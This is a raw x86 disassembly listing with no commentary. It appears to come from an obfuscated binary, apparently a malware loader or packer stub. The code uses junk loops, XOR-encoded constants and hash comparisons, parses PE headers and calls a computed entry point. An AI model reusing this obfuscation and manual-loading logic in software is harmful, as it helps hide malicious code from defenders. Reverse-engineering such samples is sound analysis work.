  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
